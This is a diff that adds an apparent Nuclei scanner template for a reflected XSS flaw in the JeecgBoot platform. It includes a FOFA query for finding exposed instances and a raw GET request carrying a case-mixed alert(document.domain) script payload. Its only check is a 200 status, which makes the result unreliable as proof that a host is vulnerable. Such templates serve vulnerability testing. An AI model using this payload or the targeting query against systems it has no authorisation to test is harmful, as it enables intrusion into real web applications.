@@ -1,0 +1,23 @@
+id: poc-gcyw6wk6240pxccc
+info:
+  name: JeecgBoot反射型XSS漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcyw6wk6240pxccc'
+  tags: xss,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gcyw6wk6240pxccc
+    fofa: app:"Jeecg-Boot 企业级快速开发平台"
+http:
+- raw:
+  - 'GET /userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3E HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/20100101Firefox/126.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
